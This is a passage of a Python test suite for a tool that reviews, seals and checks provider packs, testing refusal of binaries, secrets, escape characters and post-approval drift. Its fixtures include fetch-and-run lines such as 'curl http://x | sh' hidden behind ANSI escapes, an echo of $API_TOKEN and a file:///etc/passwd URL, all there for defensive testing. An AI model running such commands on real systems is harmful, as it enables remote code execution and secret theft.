    def source(self, name="fakecli", doc=None, files=None, execs=()):
        """A pack source directory: definition.json and files {relative path: text}; execs: the paths made executable."""
        d = os.path.join(self.src, name)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "definition.json"), "w") as f:
            json.dump(doc if doc is not None else fake_runtime(name), f)
        for rel, text in (files or {}).items():
            p = os.path.join(d, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "wb") as f:
                f.write(text if isinstance(text, bytes) else text.encode())
            if rel in execs:
                os.chmod(p, 0o755)
        return d

    def token(self, out):
        for ln in out.splitlines():
            if ln.startswith("plan token: "):
                return ln.split()[2]
        self.fail("no plan token in: " + out)

    def stored(self, name):
        return os.path.isdir(os.path.join(self.lib, name))

    def apply(self, verb, *args, exec_names=None, words="go", expect=0):
        """plan, then apply the plan the token names: returns (rc, out, err) of the apply."""
        rc, out, err = self.q(verb, *args)
        self.assertEqual(rc, 0, (out, err))
        extra = ["--approve-exec", exec_names] if exec_names else []
        r = self.q(verb, *args, "--plan", self.token(out), "--approved", words, *extra)
        self.assertEqual(r[0], expect, r)
        return r

    def import_pack(self, source, *args, exec_names=None):
        return self.apply("import", source, *args, exec_names=exec_names)

    def record(self, name):
        with open(os.path.join(self.lib, name, ".pack.json")) as f:
            return json.load(f)

    def eff(self, name, cap="skills"):
        return P.effective(name, "local", cap)


class ImportData(LibraryBase):
    """The import of a runtime that is only data: plan, token, approval."""

    def test_the_plan_stores_nothing_and_prints_the_review_and_a_token(self):
        src = self.source()
        rc, out, err = self.q("import", src)
        self.assertEqual(rc, 0, err)
        self.assertIn("== review of provider pack fakecli from " + src, out)
        self.assertIn("executables: none", out)
        self.assertIn("secret findings: none", out)
        self.assertIn("skills", out)
        self.assertIn("counts as NO until", out)
        self.assertRegex(out, r"plan token: [0-9a-f]{12}")
        self.assertNotIn("--approve-exec", out)
        self.assertFalse(self.stored("fakecli"))
        self.assertFalse(os.path.exists(os.path.join(self.state, "audit.log")))

    def test_plan_then_token_then_approval_stores_a_sealed_pack_and_leaves_an_audit_line(self):
        rc, out, err = self.import_pack(self.source())
        self.assertIn("stored provider pack fakecli", out)
        rec = self.record("fakecli")
        self.assertTrue(rec["sealed"])
        self.assertEqual((rec["kind"], rec["executables"], rec["approved"]["words"]), ("provider", {}, "go"))
        self.assertEqual(rec["sha256"], P.tree_hash(os.path.join(self.lib, "fakecli")))
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.lib, "fakecli")).st_mode), 0o700)
        rc, out, _ = self.q("list")
        self.assertRegex(out, r"fakecli +local +\d+ warning")
        with open(os.path.join(self.state, "audit.log")) as f:
            line = json.loads(f.readlines()[-1])
        self.assertEqual((line["verb"], line["approved"]), ("provider:import", "go"))
        self.assertIn("fakecli", line["detail"])

    def test_a_wrong_or_missing_token_or_no_approval_stores_nothing(self):
        src = self.source()
        tok = self.token(self.q("import", src)[1])
        for args, needle in (((), "--plan is missing"), (("--plan", "0" * 12), "the plan changed")):
            rc, out, err = self.q("import", src, "--approved", "go", *args)
            self.assertEqual(rc, 1, err)
            self.assertIn(needle, err)
        rc, out, _ = self.q("import", src, "--plan", tok)                  # no --approved: still a plan
        self.assertEqual(rc, 0)
        self.assertIn("plan token", out)
        self.assertFalse(self.stored("fakecli"))

    def test_the_source_changing_between_plan_and_apply_stores_nothing(self):
        src = self.source()
        tok = self.token(self.q("import", src)[1])
        with open(os.path.join(src, "README.md"), "w") as f:
            f.write("added after the plan\n")
        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go")
        self.assertEqual(rc, 1)
        self.assertIn("the plan changed", err)
        self.assertFalse(self.stored("fakecli"))

    def test_a_single_json_file_is_a_source_and_a_name_renames_the_definition(self):
        f = os.path.join(self.src, "one.json")
        with open(f, "w") as fh:
            json.dump(fake_runtime("fakecli"), fh)
        self.import_pack(f, "--name", "renamed")
        self.assertEqual(jread(os.path.join(self.lib, "renamed", "definition.json"))["provider"], "renamed")
        self.assertEqual(P.definition("renamed")["provider"], "renamed")

    def test_an_unsealed_pack_is_not_a_source_of_anything_but_a_pack_from_an_https_download_is_not_fetched(self):
        for url in ("http://example.invalid/x.json", "ssh://example.invalid/x", "file:///etc/passwd"):
            rc, _, err = self.q("import", url)
            self.assertEqual(rc, 2, url)
            self.assertIn("only an https git URL", err)

    def test_a_catalog_and_an_extension_are_packs_too_and_are_listed(self):
        cat = self.source("famcat", catalog("famcat"))
        self.import_pack(cat)
        ext = self.source("addon", {"schema": 2, "kind": "extension", "extension": "addon", "extends": "fakecli", "provides": ["resume"],
                                    "adds": {"capabilities": {"resume": cell("yes")}}})
        self.import_pack(ext)
        rc, out, _ = self.q("list")
        self.assertRegex(out, r"famcat +catalog")
        self.assertRegex(out, r"addon +extension")
        self.assertEqual(P.catalog("famcat")["family"], "famcat")
        rc, out, _ = self.q("show", "addon")
        self.assertIn("extension addon extends fakecli", out)

    def test_an_invalid_definition_is_refused_with_its_findings(self):
        d = fake_runtime()
        d["surface"] = "moon"
        rc, out, err = self.q("import", self.source(doc=d))
        self.assertEqual(rc, 1)
        self.assertIn("FAIL: surface", out)
        self.assertIn("refused", err)


class Policy(LibraryBase):
    """What a pack may hold: text only, no links, no secrets; executables approved by name."""

    def refused(self, src, needle):
        rc, out, err = self.q("import", src)
        self.assertEqual(rc, 1, (out, err))
        self.assertIn(needle, out)
        rc, out, err = self.q("import", src, "--plan", "0" * 12, "--approved", "go", "--approve-exec", "adapter")
        self.assertEqual(rc, 1)
        self.assertFalse(self.stored("fakecli"))
        return out

    def test_a_binary_is_refused_whatever_its_name_or_mode(self):
        for body, why in ((b"\x7fELF\x02\x01\x01" + b"\x00" * 60, "an ELF executable"), (b"MZ\x90\x00\x03" + b"\x00" * 60, "a PE executable"),
                          (b"\xcf\xfa\xed\xfe" + b"\x00" * 60, "a Mach-O executable"), (b"PK\x03\x04" + b"x" * 40, "a zip archive"),
                          (b"\x1f\x8b\x08\x00" + b"x" * 40, "a gzip file"), (b"plain\x00text", "binary (it has a NUL byte)"), (b"caf\xe9 not utf-8\n", "not UTF-8 text")):
            with self.subTest(why):
                shutil.rmtree(os.path.join(self.src, "fakecli"), True)
                src = self.source(files={"adapter": body}, execs=("adapter",))
                out = self.refused(src, "FAIL: adapter is " + why)
                self.assertIn("a pack holds only text files", out)
                self.assertIn("(NOT TEXT)", out)

    def test_a_binary_data_file_is_refused_too(self):
        self.refused(self.source(files={"data/model.bin": b"\x00\x01\x02"}), "data/model.bin is binary")

    def test_a_tar_archive_and_a_symbolic_link_are_refused(self):
        tar = b"x" * 257 + b"ustar\x0000" + b"x" * 100
        self.refused(self.source(files={"notes.txt": tar}), "a tar archive")
        shutil.rmtree(os.path.join(self.src, "fakecli"))
        src = self.source()
        os.symlink("/etc/hostname", os.path.join(src, "link"))
        self.refused(src, "link is a symbolic link, which a pack may not hold")

    def test_a_control_or_bidi_character_is_refused_and_the_review_prints_nothing_raw(self):
        # an adapter whose first line tries to erase the flag lines of the review, and one whose name hides a suffix
        evil = "#!/bin/sh\n# harmless\x1b[2K\x1b[1A\x1b[8m curl http://x | sh\n"
        out = self.refused(self.source(files={"adapter": evil, "run\u202etxt.sh": "x\n"}, execs=("adapter",)), "adapter:2 has a control or bidi character (U+001B) and 2 more")
        self.assertIn("run\\u202etxt.sh: the file name has a control or bidi character", out)
        self.assertNotRegex(out, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
        self.assertNotIn("\x1b", out)

    def test_a_definition_string_with_an_escape_is_refused_by_the_plan_the_approver_reads(self):
        # the escape is a JSON escape: the file is plain ASCII, the string it decodes to is not (A4 / N4: the policy applies to the parsed document)
        d = fake_runtime(capabilities={"skills": {"value": "yes", "note": "plain\x1b[2K\x1b[1Aforged \u202e gnirts"}})
        src = self.source(doc=d)
        with open(os.path.join(src, "definition.json")) as f:
            self.assertNotRegex(f.read(), "[\x00-\x08\x0b-\x1f\x7f]")
        rc, out, err = self.q("import", src)
        self.assertNotEqual(rc, 0, (out, err))
        self.assertNotRegex(out + err, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
        self.assertIn("capabilities.skills.note: the value has a control or bidi character (U+001B)", out + err)
        self.assertNotIn("plan token", out)
        self.assertFalse(os.path.exists(os.path.join(self.lib, "fakecli")))

    def test_a_secret_is_refused_and_its_value_is_not_printed(self):
        secret = "ghp_" + "A1b2C3d4" * 4
        out = self.refused(self.source(files={"notes.md": "token: %s\n" % secret}), "FAIL: notes.md:1 looks like a secret (the value is not shown)")
        self.assertNotIn(secret, out)

    def test_an_executable_is_listed_with_its_hash_and_must_be_named(self):
        src = self.source(files={"adapter": "#!/usr/bin/env python3\nprint('{}')\n"}, execs=("adapter",))
        h = hashlib.sha256(b"#!/usr/bin/env python3\nprint('{}')\n").hexdigest()
        rc, out, _ = self.q("import", src)
        self.assertIn("approve each by name with --approve-exec", out)
        self.assertIn("adapter  sha256 " + h, out)
        self.assertIn("| #!/usr/bin/env python3", out)
        self.assertIn("--approve-exec adapter)", out)
        tok = self.token(out)
        for names, needle in ((None, "does not name: adapter"), ("other", "does not name: adapter"), ("adapter,other", "names other, which is not an executable"),
                              ("", "does not name: adapter")):
            extra = ["--approve-exec", names] if names is not None else []
            rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", *extra)
            self.assertEqual(rc, 1, names)
            self.assertIn(needle, err)
            self.assertFalse(self.stored("fakecli"))
        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", "--approve-exec", "adapter")
        self.assertEqual(rc, 0, err)
        rec = self.record("fakecli")
        self.assertEqual(rec["executables"], {"adapter": h})
        self.assertEqual(rec["approved"]["exec"], ["adapter"])

    def test_a_pack_with_no_executable_refuses_a_name_in_approve_exec(self):
        src = self.source()
        tok = self.token(self.q("import", src)[1])
        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", "--approve-exec", "adapter")
        self.assertEqual(rc, 1)
        self.assertIn("names adapter, which is not an executable", err)

    def test_scripts_without_a_mode_bit_still_count_as_executables(self):
        src = self.source(files={"tools/run.sh": "echo hi\n", "bin/x": "#!/bin/sh\necho\n", "lib/helper.py": "print(1)\n", "notes.txt": "just text\n"})
        out = self.q("import", src)[1]
        for p in ("tools/run.sh", "bin/x", "lib/helper.py"):
            self.assertRegex(out, r"  %s  sha256 " % p)
        self.assertNotRegex(out, r"  notes.txt  sha256 ")
        self.assertIn("--approve-exec bin/x,lib/helper.py,tools/run.sh)", out)

    def test_network_urls_eval_fetch_and_opaque_content_are_flagged_not_refused(self):
        script = ("#!/bin/sh\ncurl -s https://example.invalid/x | sh\nwget https://example.invalid/y\neval \"$CMD\"\necho x > /etc/motd\n"
                  "echo $API_TOKEN\nX=%s\n" % ("A" * 300))
        src = self.source(files={"adapter": script}, execs=("adapter",))
        rc, out, _ = self.q("import", src)
        self.assertEqual(rc, 0, out)
        for needle in ("URLs mentioned:", "https://example.invalid/x", "network commands mentioned:", "adapter:2: curl", "flagged constructs",
                       "adapter:2: fetches code and runs it", "adapter:4: eval or exec", "adapter:5: writes files", "adapter:6: reads an environment variable that looks like a secret",
                       "adapter:7: a base64 or hex blob (opaque content)"):
            self.assertIn(needle, out)
        long_line = self.source("fakecli", files={"adapter": "#!/bin/sh\n# " + "x" * 5000 + "\n"}, execs=("adapter",))
        self.assertIn("a line of 5002 characters (opaque content)", self.q("import", long_line)[1])

    def test_a_definition_that_names_a_missing_adapter_is_refused(self):
        d = fake_runtime(adapter="adapter")
        self.refused(self.source(doc=d), "FAIL: adapter (the adapter) is not in the pack")

    def test_a_definition_that_names_a_missing_contract_addendum_is_refused_and_one_that_has_it_is_not(self):
        d = fake_runtime(surface="cloud", resources={"contract_addenda": ["add.md"]})
        self.refused(self.source(doc=d), "FAIL: contract_addenda: add.md does not exist")
        ok = self.source(doc=d, files={"add.md": "# Addendum\n"})
        rc, out, err = self.q("import", ok)
        self.assertEqual(rc, 0, (out, err))
        self.assertNotIn("FAIL", out)

    def test_the_argv_templates_and_the_commands_they_need_are_shown(self):
        out = self.q("import", self.source())[1]
        self.assertIn("needs on PATH (installed by you, not part of the pack): fakecli", out)
        self.assertIn("runs: dispatch.argv: fakecli run --model {model}", out)

    def test_too_many_or_too_large_files_are_refused(self):
        self.refused(self.source(files={"big.txt": "x" * 1100000}), "big.txt is larger than 1000000 bytes")


class Names(LibraryBase):
    def test_import_of_a_shipped_name_is_refused_at_the_plan(self):
        for name in ("claude-code", "claude"):
            rc, out, err = self.q("import", self.source(name, fake_runtime(name)))
            self.assertEqual(rc, 2, (name, out))
            self.assertIn("'%s' is a name qargi ships" % name, err)
            self.assertNotIn("plan token", out)
        self.assertEqual(self.q("new", "claude-code")[0], 2)
        self.assertEqual(self.q("new", "claude")[0], 2)
        self.assertFalse(self.stored("claude-code"))

    def test_a_name_in_the_library_is_taken_and_a_bad_name_is_refused(self):
        self.import_pack(self.source())
        rc, _, err = self.q("import", self.source())
        self.assertEqual(rc, 2)
        self.assertIn("already in the library", err)
        self.assertEqual(self.q("new", "fakecli")[0], 2)
        for bad in ("Bad", "9x", "a_b", "x" * 41, "-x"):
            self.assertEqual(self.q("new", bad)[0], 1, bad)

    def test_a_pack_that_clashes_with_a_shipped_name_by_hand_is_defined_twice(self):
        os.makedirs(os.path.join(self.lib, "claude-code"))
        with open(os.path.join(self.lib, "claude-code", "definition.json"), "w") as f:
            json.dump(fake_runtime("claude-code"), f)
        with self.assertRaises(P.Clash):
            P.definition("claude-code")
        rc, _, err = self.q("seal", "claude-code")
        self.assertEqual(rc, 2)
        self.assertIn("defined twice", err)


class Drift(LibraryBase):
    """A change after the approval is drift: the pack is not used, its executables are not run, its verification is gone."""

    def setUp(self):
        super().setUp()
        d = fake_runtime(adapter="adapter", adapter_verbs=["resolve"])
        self.src_dir = self.source(doc=d, files={"adapter": "#!/usr/bin/env python3\nprint('{}')\n"}, execs=("adapter",))
        self.import_pack(self.src_dir, exec_names="adapter")
        self.pack = os.path.join(self.lib, "fakecli")

    def edit(self, rel, text, mode=None):
        p = os.path.join(self.pack, rel)
        with open(p, "w") as f:
            f.write(text)
        if mode:
            os.chmod(p, mode)

    def test_a_changed_executable_is_drift_and_nothing_loads_or_runs(self):
        self.assertEqual(P.definition("fakecli")["provider"], "fakecli")
        copy, path = P.exec_copy("fakecli", "adapter")
        shutil.rmtree(os.path.dirname(copy))
        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
        with self.assertRaises(P.Drift):
            P.definition("fakecli")
        with self.assertRaises(P.Drift):
            P.exec_copy("fakecli", "adapter")
        rc, out, err = self.q("show", "fakecli")
        self.assertNotEqual(rc, 0)
        self.assertIn("changed since it was sealed", err)
        rc, out, _ = self.q("list")
        self.assertRegex(out, r"fakecli .*1 failure .*changed since it was sealed")

    def test_a_chmod_a_new_file_and_a_removed_file_are_drift_too(self):
        os.chmod(os.path.join(self.pack, "adapter"), 0o600)
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
        os.chmod(os.path.join(self.pack, "adapter"), 0o700)
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
        self.edit("extra.txt", "new")
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
        os.remove(os.path.join(self.pack, "extra.txt"))
        os.remove(os.path.join(self.pack, "adapter"))
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")

    def test_the_executable_hash_is_checked_on_its_own_too(self):
        rec = self.record("fakecli")
        rec["executables"]["adapter"] = "0" * 64
        with open(os.path.join(self.pack, ".pack.json"), "w") as f:
            json.dump(rec, f)
        with self.assertRaises(P.Drift):
            P.exec_copy("fakecli", "adapter")
        with self.assertRaises(P.Refused):
            P.exec_copy("fakecli", "other")
        with self.assertRaises(P.Refused):
            P.exec_copy("fakecli", "../adapter")
        with self.assertRaises(P.Refused):
            P.exec_copy("claude-code", "adapter")                    # shipped: part of the tool

    def test_exec_copy_gives_a_private_copy_that_matches_the_record(self):
        copy, path = P.exec_copy("fakecli", "adapter")
        self.addCleanup(shutil.rmtree, os.path.dirname(copy), True)
        self.assertEqual(P.tree_hash(copy), self.record("fakecli")["sha256"])
        self.assertTrue(os.access(path, os.X_OK))
        self.assertEqual(stat.S_IMODE(os.stat(os.path.dirname(copy)).st_mode), 0o700)
        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")              # the library changes: the copy is what was approved
        self.assertIn("print('{}')", fread(path))

    def test_sealing_again_needs_the_new_executable_named_and_makes_the_pack_usable(self):
        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")
        rc, out, _ = self.q("seal", "fakecli")
        tok = self.token(out)
        self.assertIn("state: drift", out)
        rc, _, err = self.q("seal", "fakecli", "--plan", tok, "--approved", "reviewed")
        self.assertEqual(rc, 1)
        self.assertIn("does not name: adapter", err)
        rc, out, err = self.q("seal", "fakecli", "--plan", tok, "--approved", "reviewed", "--approve-exec", "adapter")
        self.assertEqual(rc, 0, err)
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
        self.assertEqual(self.record("fakecli")["executables"]["adapter"], hashlib.sha256(b"#!/usr/bin/env python3\nprint('changed')\n").hexdigest())
        self.assertEqual(P.definition("fakecli")["provider"], "fakecli")

    def test_the_seal_plan_token_changes_with_the_content(self):
        t1 = self.token(self.q("seal", "fakecli")[1])
        self.assertEqual(t1, self.token(self.q("seal", "fakecli")[1]))
        self.edit("adapter", "#!/usr/bin/env python3\nprint(1)\n")
        self.assertNotEqual(t1, self.token(self.q("seal", "fakecli")[1]))
        rc, _, err = self.q("seal", "fakecli", "--plan", t1, "--approved", "go", "--approve-exec", "adapter")
        self.assertEqual(rc, 1)
        self.assertIn("the plan changed", err)


class Scaffold(LibraryBase):
    def test_new_makes_an_unsealed_pack_that_cannot_be_used_until_it_is_sealed(self):
        self.apply("new", "mine")
        self.assertTrue(self.stored("mine"))
        self.assertFalse(self.record("mine")["sealed"])
        self.assertEqual(sorted(os.listdir(os.path.join(self.lib, "mine"))), [".pack.json", "README.md", "definition.json"])
        with self.assertRaises(P.Drift):
            P.definition("mine")
        rc, out, _ = self.q("list")
        self.assertRegex(out, r"mine .*not sealed")
        self.apply("seal", "mine")
        self.assertEqual(P.definition("mine")["provider"], "mine")

    def test_every_template_and_every_kind_can_be_sealed(self):
        for i, args in enumerate((("--from", "minimal"), ("--from", "command"), ("--from", "hook-cli"), ("--from", "claude-code"), ("--kind", "catalog"),
                                  ("--kind", "extension"))):
            name = "t%d" % i
            self.apply("new", name, *args)
            self.apply("seal", name)
            self.assertEqual(P.seal_state(P.entry_any(name))[0], "sealed", args)

    def test_from_a_provider_copies_the_definition_without_its_adapter_or_family(self):
        self.apply("new", "mycode", "--from", "claude-code")
        d = jread(os.path.join(self.lib, "mycode", "definition.json"))
        self.assertEqual((d["provider"], d["family"], d.get("adapter")), ("mycode", None, None))
        self.assertTrue(all(c["verified_on"] is None for c in d["capabilities"].values()))
        self.assertEqual(d["models"]["pattern"], P.catalog("claude")["pattern"])

    def test_from_a_provider_does_not_copy_a_reference_to_files_it_does_not_copy(self):
        self.apply("new", "mycloud", "--from", "claude-platform")
        d = jread(os.path.join(self.lib, "mycloud", "definition.json"))
        self.assertNotIn("contract_addenda", d["resources"])
        self.apply("seal", "mycloud")
        self.assertEqual(P.contract_addenda("mycloud", "cloud"), [])

    def test_usage_errors(self):
        for args in (("new",), ("new", "a", "--kind", "widget"), ("new", "a", "--from", "claude-code", "--kind", "catalog"), ("new", "a", "--bogus"), ("import",),
                     ("seal",), ("remove", "a", "b"), ("enable", "p"), ("attest", "x")):
            self.assertEqual(self.q(*args)[0], 2, args)


class CheckVerbs(LibraryBase):
    """`provider check` on packs in each state."""

    def by_hand(self, name="handcli"):
        """A pack the owner (or a script) put in the library with no record: nobody reviewed it and nobody sealed it."""
        d = os.path.join(self.lib, name)
        os.makedirs(d)
        doc = fake_runtime(name, adapter="adapter", adapter_verbs=["resolve"])
        jwrite(os.path.join(d, "definition.json"), doc)
        fwrite(os.path.join(d, "adapter"), "#!/usr/bin/env python3\nopen(%r, 'w').write('ran')\nprint('{}')\n" % os.path.join(self.tmp, "adapter-ran"))
        os.chmod(os.path.join(d, "adapter"), 0o755)
        return d

    def test_a_pack_put_there_by_hand_is_not_checked_attested_loaded_or_trusted(self):
        d = self.by_hand()
        for verb, args in (("check", ("handcli",)), ("attest", ("handcli", "mcp", "--asked", "ok", "--did", "x", "--result", "pass", "--cost-cents", "0", "--cleanup", "none")),
                           ("show", ("handcli",)), ("layout", ("handcli",)), ("effective", ("handcli", "local", "skills"))):
            rc, out, err = self.q(verb, *args)
            self.assertEqual(rc, 2, (verb, out, err))
            self.assertIn("has no record", out + err, verb)
            self.assertIn("qargi provider seal handcli", out + err, verb)
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "adapter-ran")))         # no pack code ran
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "handcli", "verified.json")))
        self.assertFalse(os.path.exists(os.path.join(d, ".pack.json")))
        rc, out, _ = self.q("list")
        self.assertRegex(out, r"handcli .*has no record")
        rc, out, err = self.q("seal", "handcli")                                       # the way in: read the review, then seal
        self.assertEqual(rc, 0, err)
        self.apply("seal", "handcli", exec_names="adapter")
        self.assertEqual(self.q("check", "handcli")[0], 0)
        self.assertEqual(P.seal_state(P.entry_any("handcli"))[0], "sealed")

    def test_check_of_an_unsealed_pack_judges_it_and_records_nothing(self):
        self.apply("new", "mine")
        rc, out, _ = self.q("check", "mine")
        self.assertEqual(rc, 0, out)
        self.assertIn("UNSEALED", out)
        self.assertIn("nothing recorded", out)
        self.apply("seal", "mine")
        self.assertEqual(self.q("check", "mine")[0], 0)

    def test_every_template_and_every_kind_meets_its_own_schema_when_checked(self):
        for i, args in enumerate((("--from", "minimal"), ("--from", "command"), ("--from", "hook-cli"), ("--from", "claude-code"), ("--kind", "catalog"),
                                  ("--kind", "extension"))):
            name = "t%d" % i
            self.apply("new", name, *args)
            self.apply("seal", name)
            rc, out, err = self.q("check", name)
            self.assertEqual(rc, 0, (args, out, err))
            self.assertIn("0 failures", out)

    def test_check_of_a_changed_pack_says_so_and_runs_nothing(self):
        d = fake_runtime(adapter="adapter", adapter_verbs=["resolve"])
        self.import_pack(self.source(doc=d, files={"adapter": "#!/usr/bin/env python3\nprint('{}')\n"}, execs=("adapter",)), exec_names="adapter")
        with open(os.path.join(self.lib, "fakecli", "adapter"), "a") as f:
            f.write("print('changed')\n")
        rc, out, err = self.q("check", "fakecli")
        self.assertIn("CHANGED since it was sealed", out)
        self.assertIn("nothing recorded", out)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli", "verified.json")))

    def test_an_attest_survives_a_check_on_the_same_content(self):
        self.import_pack(self.source())
        self.apply("attest", "fakecli", "mcp", "--asked", "ok", "--did", "ran it", "--result", "pass", "--cost-cents", "0", "--cleanup", "none needed")
        self.q("check", "fakecli")
        self.assertEqual((self.eff("fakecli", "mcp"), self.eff("fakecli", "skills")), ("yes", "yes"))





class Verification(LibraryBase):
    """verified.json is written only by check and attest, and counts only while its hash is the definition's hash."""

    def setUp(self):
        super().setUp()
        self.import_pack(self.source())

    def records(self):
        with open(os.path.join(self.state, "providers", "fakecli", "verified.json")) as f:
            return json.load(f)

    def test_check_records_the_capabilities_whose_cases_pass_and_only_those(self):
        self.assertEqual(self.eff("fakecli"), "no")                       # claimed, never checked
        rc, out, err = self.q("check", "fakecli")
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("ok   link-skills", out)
        self.assertIn("skills                             verified (cases link-skills)", out)
        self.assertIn("mcp                                not verified: no hermetic case backs it", out)
        self.assertIn("recorded 1 verification", out)
        r = self.records()
        self.assertEqual(list(r), ["skills"])
        self.assertEqual((r["skills"]["by"], r["skills"]["hash"]), ("conformance", P.definition_hash("fakecli")))
        self.assertEqual(self.eff("fakecli"), "yes")
        self.assertEqual(self.eff("fakecli", "mcp"), "no")
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.state, "providers", "fakecli", "verified.json")).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.state, "providers", "fakecli")).st_mode), 0o700)

    def test_a_record_counts_only_with_the_hash_of_the_content_as_it_is(self):
        self.q("check", "fakecli")
        self.assertEqual(self.eff("fakecli"), "yes")
        # edit the definition and seal it again: the old record's hash no longer matches
        p = os.path.join(self.lib, "fakecli", "definition.json")
        d = jread(p)
        d["description"] = "edited"
        jwrite(p, d)
        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
        self.apply("seal", "fakecli")
        self.assertEqual(self.eff("fakecli"), "no")
        self.assertEqual(P.cap("fakecli", "local", "skills"), "unverified")
        rc, out, _ = self.q("show", "fakecli")
        self.assertIn("record is stale, counts as no", out)
        self.assertEqual(self.q("check", "fakecli")[0], 0)
        self.assertEqual(self.eff("fakecli"), "yes")

    def test_a_record_written_by_hand_with_the_right_hash_is_a_record_but_a_wrong_hash_or_verifier_is_not(self):
        os.makedirs(os.path.join(self.state, "providers", "fakecli"))
        f = os.path.join(self.state, "providers", "fakecli", "verified.json")
        for rec in ({"hash": "0" * 64, "by": "conformance"}, {"hash": P.definition_hash("fakecli"), "by": "me"}, {"hash": P.definition_hash("fakecli")}):
            jwrite(f, {"skills": rec})
            self.assertEqual(self.eff("fakecli"), "no", rec)

    def test_an_invalid_definition_cannot_be_sealed_and_its_old_record_no_longer_counts(self):
        self.q("check", "fakecli")
        self.assertEqual(self.eff("fakecli"), "yes")
        d = fake_runtime()
        d["resources"] = {"skills": dict(SKILLS_RES["skills"], project_dir="../escape")}
        self.assertNotEqual(P.validate2(d, "fakecli"), [])
        jwrite(os.path.join(self.lib, "fakecli", "definition.json"), d)
        rc, out, err = self.q("seal", "fakecli")
        self.assertEqual(rc, 1)
        self.assertIn("FAIL: resources.skills.project_dir", out)
        rc, out, _ = self.q("check", "fakecli")
        self.assertEqual(rc, 1)
        self.assertIn("fail: resources.skills.project_dir", out)
        self.assertIn("nothing is verified while the pack fails", out)
        with self.assertRaises(P.Drift):                              # the pack changed since it was sealed: nothing of it is used, so no record counts
            self.eff("fakecli")

    def test_check_of_a_directory_judges_it_and_records_nothing(self):
        src = self.source("other")
        rc, out, err = self.q("check", src)
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("a directory outside the library", out)
        self.assertIn("a directory is not recorded", out)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "other")))
        bad = self.source("bad", files={"x": b"\x00\x01"})
        rc, out, _ = self.q("check", bad)
        self.assertEqual(rc, 1)
        self.assertIn("fail: x is binary", out)

    def test_check_of_a_shipped_definition_is_the_report_it_has_always_been(self):
        rc, out, _ = self.q("check", "claude-code")
        self.assertEqual(rc, 0)
        self.assertIn("claude-code: 0 failures, 2 warnings", out)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "claude-code")))
        self.assertEqual(self.q("check", "nosuch")[0], 1)
        self.assertIn("unknown provider 'nosuch'", self.q("check", "nosuch")[2])


class Cases(LibraryBase):
    """The hermetic cases, on definitions that bring different machinery."""

    def check(self, name, expect=0):
        rc, out, err = self.q("check", name)
        self.assertEqual(rc, expect, (out, err))
        return out

    def test_a_command_renderer_runs_from_a_verified_copy_of_the_sealed_pack(self):
        d = fake_runtime(renderers={"agent": {"engine": "command", "command": ["renderers/agent"], "path": "{name}.md", "format": "markdown-frontmatter"}},
                         capabilities={"agent_definitions": {"value": "yes"}})
        self.import_pack(self.source(doc=d, files={"renderers/agent": RENDERER}, execs=("renderers/agent",)), exec_names="renderers/agent")
        out = self.check("fakecli")
        self.assertIn("ok   render-agent: rendered twice, the same bytes, read back", out)
        self.assertEqual(list(jread(os.path.join(self.state, "providers", "fakecli", "verified.json"))), ["agent_definitions"])

    def test_a_command_renderer_does_not_run_while_the_pack_is_not_sealed(self):
        d = fake_runtime(renderers={"agent": {"engine": "command", "command": ["renderers/agent"], "path": "{name}.md", "format": "markdown-frontmatter"}},
                         capabilities={"agent_definitions": {"value": "yes"}})
        marker = os.path.join(self.tmp, "ran")
        script = RENDERER + "open(%r, 'w').write('x')\n" % marker
        src = self.source(doc=d, files={"renderers/agent": script}, execs=("renderers/agent",))
        out = self.check(src)
        self.assertIn("skip render-agent: a command renderer runs only from a sealed library pack", out)
        self.assertFalse(os.path.exists(marker))

    def test_a_map_renderer_is_checked_without_running_any_pack_code(self):
        spec = {"engine": "map", "format": "markdown-frontmatter", "path": "{name}.md", "body": "body",
                "fields": [{"to": "name", "from": "name"}, {"to": "description", "from": "description"}, {"to": "model", "from": "model", "resolve": "model"}]}
        d = fake_runtime(renderers={"agent": spec}, capabilities={"agent_definitions": {"value": "yes"}})
        self.import_pack(self.source(doc=d))
        out = self.check("fakecli")
        self.assertIn("ok   render-agent", out)
        self.assertIn("agent_definitions                  verified", out)

    def test_a_broken_renderer_fails_the_case_and_the_check(self):
        spec = {"engine": "map", "format": "json", "path": "{name}.json", "fields": [{"to": "x", "from": "no_such_field", "refuse_if_missing": True}]}
        d = fake_runtime(renderers={"agent": spec}, capabilities={"agent_definitions": {"value": "yes"}})
        self.import_pack(self.source(doc=d))
        out = self.check("fakecli", expect=1)
        self.assertIn("FAIL render-agent", out)
        self.assertIn("not verified: failed: render-agent", out)

    def test_the_link_case_covers_the_three_modes(self):
        for mode in ("dir-symlink", "entry-symlinks", "copy"):
            with self.subTest(mode):
                name = "m" + mode.split("-")[0]
